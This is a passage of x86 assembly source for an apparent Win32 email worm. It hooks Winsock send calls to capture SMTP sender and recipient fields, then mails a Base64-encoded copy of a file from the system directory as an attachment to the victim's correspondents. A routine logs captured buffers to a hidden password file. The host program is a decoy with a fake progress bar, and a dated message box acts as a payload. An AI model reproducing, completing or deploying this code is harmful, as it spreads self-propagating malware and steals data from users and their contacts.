    mov ecx, [esp+(8*4)+(1*4)+4 + 8]        ; size of buffer

    MimeFromLoop:
    lea edi, [ebp + fromtag]
    push ecx
    push esi
    mov ecx, 05h
    rep cmpsb
    pop esi
    pop ecx
    je SearchMimeFromEnd
    inc esi
    loop MimeFromLoop

    CheckMimeTo:
    mov esi, [esp+(8*4)+(1*4)+4 + 4]        
    mov ecx, [esp+(8*4)+(1*4)+4 + 8]        

    MimeToLoop:
    lea edi, [ebp + totag]
    push ecx
    push esi
    mov ecx, 03h
    rep cmpsb
    pop esi
    pop ecx
    je SearchMimeToEnd
    inc esi
    loop MimeToLoop
    jmp CheckQuit

    SearchMimeFromEnd:
    push esi

    FromEndLoop:
    lea edi, [ebp + mimeendtag]
    push ecx
    push esi
    mov ecx, 01h
    rep cmpsb
    pop esi
    pop ecx
    je SaveMimeFrom
    inc esi
    loop FromEndLoop
    
    pop esi
    jmp Continue

    SaveMimeFrom:
    mov eax, esi
    pop esi
    sub eax, esi
    mov ecx, eax
    add ecx, 03h
    mov [ebp + mimefromsize], ecx
    push esi
    push ecx

    push ecx
    push 00h
    lea eax, [ebp + AGlobalAlloc]
    call GETAPI
    or eax, eax
    jz MimeError
    mov [ebp + mimefrom_address], eax

    pop ecx
    pop esi
    mov edi, eax
    rep movsb

    mov [ebp + fromstatus], 01h
    cmp [ebp + tostatus], 01h
    jne CheckMimeTo 
    mov [ebp + status], 05h
    jmp CheckQuit

    SearchMimeToEnd:
    push esi

    ToEndLoop:
    lea edi, [ebp + toendtag]
    push ecx
    push esi
    mov ecx, 08h
    rep cmpsb
    pop esi
    pop ecx
    je SaveMimeTo
    inc esi
    loop ToEndLoop

    pop esi
    jmp Continue

    SaveMimeTo:
    mov eax, esi
    pop esi
    sub eax, esi
    mov ecx, eax
    mov [ebp + mimetosize], ecx
    push esi
    push ecx

    push ecx
    push 00h
    lea eax, [ebp + AGlobalAlloc]
    call GETAPI
    or eax, eax
    jz MimeError
    mov [ebp + mimeto_address], eax

    pop ecx
    pop esi
    mov edi, eax
    rep movsb

    mov [ebp + tostatus], 01h
    cmp [ebp + fromstatus], 01h
    jne CheckMimeFrom       
    mov [ebp + status], 05h
    jmp CheckQuit

    MimeError:
    pop ecx
    pop esi
    mov [ebp + status], 05h

    CheckQuit:
    mov esi, [esp+(8*4)+(1*4)+4 + 4]        
    mov ecx, [esp+(8*4)+(1*4)+4 + 8]        
    cmp [esi], 'TIUQ'       
    jne Continue

    pushad
    call SEND_MAIL
    popad
    
    jmp InterceptionFinished

    ErrorWhileSending:
    pop esi
    pop ecx
    
    InterceptionFinished:
    mov [ebp + status], 00h
    mov [ebp + totalrcptsize], 00h
    mov [ebp + rcptnumber], 00h
    mov [ebp + tostatus], 00h
    mov [ebp + fromstatus], 00h
    jmp Continue

    Continue:   
    popad
    lea eax, [ebp + InterceptWsockApiCall]          ; get ep va
    sub eax, dword ptr [ebp + wnewapiaddress]   ; - ep RVA
    add eax, dword ptr [ebp + woldapiaddress]   ; = imagebase
    pop ebp 
    jmp eax

INTERCEPT_WSOCK endp

;========================[ ic-ws_attachment.inc ]===========================;

PREPARE_ATTACHMENT proc

    SetSysDir:
    call SET_SYSDIR

    OpenSourceFile:
        push 0
        push 0
        push 3
        push 0
        push 0
        push 80000000h
        lea eax, [ebp + wsock2]
        push eax
    lea eax, [ebp + ACreateFile]
    call GETAPI
        mov [ebp + filehandle], eax             ; save file handle
    cmp eax, -1
    je NoBase64Encode
  
    GetSourceFileSize:
    push 00h
    push dword ptr [ebp + filehandle]
    lea eax, [ebp + AGetFileSize]
    call GETAPI

    or eax, eax
    jz NoBase64Encode
    mov [ebp + filesize], eax           ; get file size
    
    AllocateSourceMemory:
    add eax, 02h
    push eax
    push 00h
    lea eax, [ebp + AGlobalAlloc]
    call GETAPI

    or eax, eax
        jz NoBase64Encode                   ; not enough memory?
        mov [ebp + smHnd], eax              ; sourcememory handle

    AllocateDestinationMemory:
    mov eax, [ebp + filesize]
    xor edx, edx
    mov ecx, 02h
    mul ecx
    push eax
    push 00h
    lea eax, [ebp + AGlobalAlloc]
    call GETAPI
    
    or eax, eax
    jz NoBase64Encode                   ; not enough memory?
    mov [ebp + dmHnd], eax              ; destinationmemory handle

    ReadSourceFile:
        mov [ebp + bytesread], 00h

    push 00h
        lea eax, [ebp + bytesread]
        push eax
        push [ebp + filesize] 
        push dword ptr [ebp + smHnd]
        push dword ptr [ebp + filehandle]
    lea eax, [ebp + AReadFile]
    call GETAPI

        mov eax, dword ptr [ebp + bytesread]
    or eax, eax
        jz NoBase64Encode               ; nothing read ?

    CloseSourceFile:
        push dword ptr [ebp + filehandle]               ; close the file
    lea eax, [ebp + ACloseHandle]
    call GETAPI

    EncodeSourceData:
    mov eax, dword ptr [ebp + smHnd]
    mov edx, dword ptr [ebp + dmHnd]
    mov ecx, dword ptr [ebp + filesize]
    call BASE64_ENCODER                     ; encode into Base64
    mov [ebp + encodedsize], ecx

    NoBase64Encode:
    ret

PREPARE_ATTACHMENT endp

;=========================[ ic-ws_b64encoder.inc ]==========================;

BASE64_ENCODER proc

    ; in:   eax address of data to encode
    ;       edx address to put encoded data
    ;       ecx size of data to encode
    ;
    ; out:  ecx size of encoded data
    ;

    CheckFileSize:
    push eax
    push edx
    push ecx
    mov eax, ecx
    xor edx, edx
    mov ecx, 03h
    div ecx
    pop ecx
    or edx, edx
    jz EncodeBase64

    AddTwoBytes:
    cmp edx, 01h
    jne AddOneByte
    add ecx, 02h
    jmp EncodeBase64

    AddOneByte:
    add ecx, 01h

    EncodeBase64:    
    pop edx
    pop eax
    xor esi, esi
    lea edi, [ebp + encTable]
    push ebp
    xor ebp, ebp  

    BaseLoop:
    xor ebx, ebx
    mov bl, byte ptr [eax]
    shr bl, 2
    and bl, 00111111b
    mov bh, byte ptr [edi+ebx]
    mov byte ptr [edx+esi], bh
    inc esi

    mov bx, word ptr [eax]
    xchg bl, bh
    shr bx, 4
    xor bh, bh
    and bl, 00111111b
    mov bh, byte ptr [edi+ebx]
    mov byte ptr [edx+esi], bh
    inc esi

    inc eax
    mov bx,word ptr [eax]
    xchg bl, bh
    shr bx, 6
    xor bh, bh
    and bl, 00111111b
    mov bh, byte ptr [edi+ebx]
    mov byte ptr [edx+esi], bh
    inc esi

    inc eax
    xor ebx, ebx
    mov bl, byte ptr [eax]
    and bl, 00111111b
    mov bh, byte ptr [edi+ebx]
    mov byte ptr [edx+esi], bh
    inc esi
    inc eax

    inc ebp
    cmp ebp, 24
    ja AddEndOfLine
    inc ebp

    AddedEndOfLine:
    sub ecx, 3
    or ecx, ecx
    jnz BaseLoop

    mov word ptr [edx+esi], 0a0dh
    add esi, 2  
    mov ecx, esi
    pop ebp
    ret

    AddEndOfLine:
    xor ebp, ebp
    mov word ptr [edx+esi], 0a0dh
    add esi, 2
    jmp AddedEndOfLine

BASE64_ENCODER endp

;=======================[ ic-ws_write_to_file.inc ]=========================;

WRITE_TO_FILE proc

    StoreBuffer:
    push esi
    push ecx

    SetEmailDropDir:
    call SET_WINDIR

    CreateEmailDrop:
    push 0                      ; template handle=0
    push 20h                    ; attributes=any file
    push 04h                    ; type= existing file
    push 0                      ; security option = 0
    push 1                      ; shared for read
    push 80000000h or 40000000h         ; generic read write
    lea eax, [ebp + passwordfile]
    push eax                    ; offset file name
    lea eax, [ebp + ACreateFile]
    call GETAPI 
    mov [ebp + filehandle], eax         ; save file handle
    cmp eax, -1
    je BufferError

    SetDropPointer:
    push 2
    push 0
    push 0
    push dword ptr [ebp + filehandle]       ; filehandle
    lea eax, [ebp + ASetFilePointer]
    call GETAPI

    pop ecx
    pop esi

    WriteBuffer:
    push 0h
    lea eax, [ebp + writtenbytes]
    push eax
    push ecx                    ; push buffersize
    push esi                    ; push offset buffer
    push dword ptr [ebp + filehandle]
    lea eax, [ebp + AWriteFile]
    call GETAPI

    CloseBufferFile:
        push dword ptr [ebp + filehandle]
    lea eax, [ebp + ACloseHandle]
    call GETAPI
    ret

    BufferError:
    pop ecx
    pop esi
    ret

WRITE_TO_FILE endp

;============================[ ic-send_mail.inc ]============================;

SEND_MAIL proc

    GetAllApiAddresses:
    call GET_WSOCK32_BASE_ADDRESS
    call GET_USER32_BASE_ADDRESS
    call PREPARE_ATTACHMENT

        mov eax, [ebp + filehandle]
    cmp eax, -1                 ; attachment error
    je SendError

    AllocateEmailBufferMemory:
    mov eax, [ebp + encodedsize]
    mov ecx, 02h
    mul ecx
    push eax
    push 00h
    lea eax, [ebp + AGlobalAlloc]
    call GETAPI

    or eax, eax
    jz SendError                    ; mem for email
    mov [ebp + email_buffer_address], eax       ; buffer

    SendMailFromTag:
    mov eax, dword ptr [ebp + fromaddress]
    mov ecx, dword ptr [ebp + fromsize]
    call SendCommand
    call ReceiveReply

    SendRcptToTags:
    xor ecx, ecx
    mov [ebp + totalrcptsize], 00h
        
    RcptSendLoop:
    push ecx
    
    mov edi, [ebp + rcpt_size_address]
    mov eax, ecx
    mov edx, 04h
    mul edx
    add edi, eax
    mov ecx, dword ptr [edi]

    mov esi, [ebp + rcpt_buffer_address]
    mov eax, [ebp + totalrcptsize]
    add esi, eax
    
    pushad
    mov eax, esi
    call SendCommand
    call ReceiveReply
    popad

    add eax, ecx
    mov [ebp + totalrcptsize], eax
    
    pop ecx
    inc ecx
    mov eax, [ebp + rcptnumber]
    cmp ecx, eax
    jne RcptSendLoop

    SendDataCommand:
    lea eax, [ebp + datatag]
    mov ecx, 06h
    call SendCommand
    call ReceiveReply

    EmailBody_EmailId:
    mov [ebp + email_size], 00h
    mov edi, [ebp + email_buffer_address]
    lea esi, [ebp + emailid]
    mov ecx, 21d
    add [ebp + email_size], ecx
    rep movsb

    EmailBody_EmailFrom:
    cmp [ebp + fromstatus], 01h
    jne EmailBody_MakeEmailFrom

    mov esi, [ebp + mimefrom_address]
    mov ecx, [ebp + mimefromsize]
    add [ebp + email_size], ecx
    rep movsb
    jmp EmailBody_EmailTo

    EmailBody_MakeEmailFrom:
    lea esi, [ebp + fromtag]
    mov ecx, 05h
    add [ebp + email_size], ecx
    rep movsb

    mov esi, dword ptr [ebp + fromaddress] 
    add esi, 11d
    mov ecx, dword ptr [ebp + fromsize]
    sub ecx, 11d
    add [ebp + email_size], ecx
    rep movsb

    EmailBody_EmailTo:
    cmp [ebp + tostatus], 01h
    jne EmailBody_MakeEmailTo

    mov esi, [ebp + mimeto_address]
    mov ecx, [ebp + mimetosize]
    add [ebp + email_size], ecx
    rep movsb
    jmp EmailBody_EmailStartPart

    EmailBody_MakeEmailTo:
    lea esi, [ebp + totag]
    mov ecx, 03h
    add [ebp + email_size], ecx
    rep movsb       

    xor ecx, ecx
    mov [ebp + totalrcptsize], 00h
        
    RcptStringLoop:
    push ecx
    
    push edi
    mov edi, [ebp + rcpt_size_address]
    mov eax, ecx
    mov edx, 04h
    mul edx
    add edi, eax
    mov ecx, dword ptr [edi]
    pop edi

    push ecx
    mov esi, [ebp + rcpt_buffer_address]
    mov eax, [ebp + totalrcptsize]
    add esi, eax
    add esi, 08h
    sub ecx, 08h
    add [ebp + email_size], ecx
    rep movsb

    pop ecx
    add eax, ecx
    mov [ebp + totalrcptsize], eax
    
    pop ecx
    inc ecx
    mov eax, [ebp + rcptnumber]
    cmp ecx, eax
    jne RcptStringLoop

    EmailBody_EmailStartPart:
    lea esi, [ebp + emailstart]
    mov ecx, emailend-emailstart
    add [ebp + email_size], ecx
    rep movsb

    EmailBody_EmailAttachement:
    mov esi, dword ptr [ebp + dmHnd]
    mov ecx, [ebp + encodedsize]
    add [ebp + email_size], ecx
    rep movsb   

    EmailBody_EmailEndPart:
    lea esi, [ebp + emailtail]
    mov ecx, 17d
    add [ebp + email_size], ecx
    rep movsb   

    EmailBody_EndTag:
    lea esi, [ebp + endtag]
    mov ecx, 05h
    add [ebp + email_size], ecx
    rep movsb

    SendEmailBody:
    mov eax, [ebp + email_buffer_address]
    mov ecx, [ebp + email_size]
    call SendCommand
    call ReceiveReply

    MessageBoxDay:
    lea eax, [ebp + timedate]
    push eax
    lea eax, [ebp + AGetSystemTime]
    call GETAPI
    
    xor eax, eax
    mov ax, word ptr [ebp + timedate.wMonth]
    cmp ax, 07h
    jne SendError
    mov ax, word ptr [ebp + timedate.wDay]
    cmp ax, 01h
    jne SendError

    MessageBoxPayload:
    mov eax, 0040h
    push eax                            
        lea eax, [ebp + windowtitle]    
    push eax
    lea eax, [ebp + msgmessage]
    push eax
        push 00h
    lea eax, [ebp + AMessageBox]
    call GETUAPI    
    
    SendError:
    ret

;-----------------------------[ send routine ]------------------------------;

    SendCommand:
    push eax

    push 0h
    push ecx
    push eax
    push dword ptr [ebp + socketh]
    lea eax, [ebp + ASend]
    call GETWAPI
        
    cmp eax, -1
    jne SendWentOk

    pop eax
    jmp SendCommand

     SendWentOk:
    pop eax
    ret

;--------------------------[ receive routine ]------------------------------;

     ReceiveReply:
    push LARGE 0
    push LARGE 60
    lea eax, [ebp + recvbuffer]
    push eax
    push dword ptr [ebp + socketh]
    lea eax, [ebp + ARecv]
    call GETWAPI                    ; call the api

    cmp eax, -1
    je ReceiveReply
    ret
    
SEND_MAIL endp

;****************************************************************************;

    Leap:

.code
 
    OriginalHost:
    push 0
    call GetModuleHandleA               
    mov hInst, eax                  

    CreateProgressWindow:
    push 00h                    
    push offset MYDIALOG_0              
    push 00h                        
    push 102                    
    push hInst                      
    call DialogBoxParamA                

    CreateMainWindow:
    push 00h                    
    push offset MYDIALOG_1              
    push 00h                        
    push 103                    
    push hInst                      
    call DialogBoxParamA                

    Leave:
    push 0
    call ExitProcess

;============================[ ic-host_code.inc ]============================;

MYDIALOG_0 proc handle, umsg, wparam, lparam: dword

    CheckParameter:
    cmp [umsg], WM_INITDIALOG
    je CenterDlg
    cmp [umsg], WM_DESTROY
    je Exit
    cmp [umsg], WM_CLOSE
    je Exit 
    cmp flag, 01h
    je CreateProgressThread
    cmp flag, 02h
    je Exit
    xor eax, eax
    ret

    CenterDlg:
    push offset dlgrect
    push handle
        call GetWindowRect
    call GetDesktopWindow
    push offset desktoprect
    push eax
        call GetWindowRect

        push 00h
        mov eax, dlgrect.rcBottom
        sub eax, dlgrect.rcTop
        mov dlgheight, eax
        push eax                        ; height
        mov eax, dlgrect.rcRight
        sub eax, dlgrect.rcLeft
        mov dlgwidth, eax                   ; width
        push eax
        mov eax, desktoprect.rcBottom       
        sub eax, dlgheight
        shr eax, 1
        push eax                        ; bottom
        mov eax, desktoprect.rcRight
        sub eax, dlgwidth
        shr eax, 1
        push eax                        ; top
        push handle                     ; handle
        call MoveWindow                     ; move to center
    mov flag, 01h
    xor eax, eax
    ret

    CreateProgressThread:
    push offset threadid
    push 00h
    push handle
    push offset PROGRESS
    push 00h
    push 00h
    call CreateThread
    mov flag, 00h
    xor eax, eax
    ret

    Exit:
    push wparam
    push handle
    call EndDialog
    mov eax, 01h
    ret

MYDIALOG_0 endp

MYDIALOG_1 proc handle, umsg, wparam, lparam: dword

    CheckParameter1:
    cmp [umsg], WM_INITDIALOG
    je CenterDlg1
    cmp [umsg], WM_DESTROY
    je Exit1
    cmp [umsg], WM_CLOSE
    je Exit1
    cmp [umsg], WM_COMMAND
    je CheckCommand
    cmp [umsg], WM_VSCROLL
    je SpinButtonClick
    cmp initflag, 01h
    je InitValues 
    xor eax, eax
    ret    

    CheckCommand:
    cmp [wparam], 1009
    je Exit
    cmp [wparam], 1014
    je SetOkFlag
    xor eax, eax
    ret

    SpinButtonClick:
    xor eax, eax
    mov ecx, [wparam]
    rol ecx, 16
    mov ax, cx

    mov ecx, pastvalue
    cmp ecx, eax
    jge PressedUp

    PressedDown:
    mov pastvalue, eax
    cmp doneflag, 00h
    jne Reset
    cmp currentvalue, '0'
    je DontDecrease
    dec byte ptr currentvalue

    DontDecrease:
    push offset currentvalue
    push 00h
    push WM_SETTEXT
    push 1003
    push handle
    call SendDlgItemMessageA
    mov doneflag, 01h
    xor eax, eax
    ret

    PressedUp:
    mov pastvalue, eax
    cmp currentvalue, '9'
    je Reset
    cmp doneflag, 00h
    jne Reset
    inc byte ptr currentvalue
    push offset currentvalue
    push 00h
    push WM_SETTEXT
    push 1003
    push handle
    call SendDlgItemMessageA
    mov doneflag, 01h
    xor eax, eax
    ret

    Reset:
    mov doneflag, 00h
    xor eax, eax
    ret

    SetOkFlag:
    mov okflag, 01h
    jmp Exit

    CenterDlg1:
    push offset dlgrect
    push handle
        call GetWindowRect
    call GetDesktopWindow
    push offset desktoprect
    push eax
        call GetWindowRect

        push 00h
        mov eax, dlgrect.rcBottom
        sub eax, dlgrect.rcTop
        mov dlgheight, eax
        push eax                ; height
        mov eax, dlgrect.rcRight
        sub eax, dlgrect.rcLeft
        mov dlgwidth, eax           ; width
        push eax
        mov eax, desktoprect.rcBottom       
        sub eax, dlgheight
        shr eax, 1
        push eax                ; bottom
        mov eax, desktoprect.rcRight
        sub eax, dlgwidth
        shr eax, 1
        push eax                ; top
        push handle             ; handle
        call MoveWindow             ; move to center
    mov initflag, 01h
        xor eax, eax
        ret
  
    InitValues:
    mov initflag, 00h
    call SendDlgItemMessageA, handle, 1004, CB_RESETCONTENT, 00h,00h
    call SendDlgItemMessageA, handle, 1004, 143h, 00h, offset value11
    call SendDlgItemMessageA, handle, 1004, 143h, 00h, offset value12
    call SendDlgItemMessageA, handle, 1004, 143h, 00h, offset value13
    call SendDlgItemMessageA, handle, 1004, 143h, 00h, offset value14
    call SendDlgItemMessageA, handle, 1004, CB_SETCURSEL, 00h, 01h
    call SendDlgItemMessageA, handle, 1003, WM_SETTEXT, 00h, offset currentvalue
    call SendDlgItemMessageA, handle, 1005, WM_SETTEXT, 00h, offset value3
    call SendDlgItemMessageA, handle, 1008, WM_SETTEXT, 00h, offset value4
    call SendDlgItemMessageA, handle, 1000, 00F5h, 00h,00h
    call SendDlgItemMessageA, handle, 1001, 00F5h, 00h,00h
    call SendDlgItemMessageA, handle, 1006, 00F5h, 00h,00h
    call SendDlgItemMessageA, handle, 1010, 00F5h, 00h,00h
    call SendDlgItemMessageA, handle, 1013, 00F5h, 00h,00h
    xor eax, eax
    ret

    Exit1:
    push wparam       
    push handle       
    call EndDialog      
    mov eax, 01h
    ret

MYDIALOG_1 endp

PROGRESS proc handle: dword

    ClearProgressBar:
    push 00h
    push 00h
    push PBM_SETPOS
    push 105
    push handle
        call SendDlgItemMessageA
    xor eax, eax
    xor ecx, ecx

    LittleLoop:
    inc ecx
    cmp ecx, 100000h
    jne LittleLoop  

    ProgressLoop:
    inc eax
    push 00h
    push eax
    push PBM_SETPOS
    push 105
    push handle
    call SendDlgItemMessageA
    xor ecx, ecx
    cmp eax, 99d
    jne LittleLoop

    ProgressDone:
    mov flag, 02h
    push threadid
    call CloseHandle
    ret

PROGRESS endp

;============================================================================;

end Start
end
